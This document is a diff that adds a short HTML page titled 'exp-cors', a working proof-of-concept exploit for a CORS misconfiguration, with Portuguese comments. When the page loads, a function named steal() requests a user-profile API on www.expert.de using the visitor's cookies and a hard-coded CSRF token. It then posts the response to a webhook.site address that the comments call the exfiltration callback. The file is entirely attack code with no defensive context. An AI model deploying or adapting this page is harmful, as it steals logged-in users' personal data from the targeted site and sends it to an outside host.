@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<meta charset="utf-8">
+<title>exp-cors</title>
+<script>
+  // callback de exfiltração (pode salvar em https://webhook.site se quiser)
+  const HOOK = 'https://webhook.site/adf2fe42-6019-4297-b27a-ca8bf04acf73';
+
+  // helpers
+  function log(txt){
+     fetch(HOOK, {method:'POST', mode:'no-cors', body: txt}).catch(()=>{});
+  }
+
+  function steal(){
+     log('init');
+     fetch('https://www.expert.de/api/user/profile',{
+       credentials:'include',
+       headers:{'csrf-token':'1e206742-fb4a-44d2-8174-be9b2e2d6425'}
+     })
+     .then(r => r.text())
+     .then(d => log(d))
+     .catch(e => log('erro:'+e));
+  }
+
+  // roda automaticamente após carregar
+  window.onload = steal;
+</script>
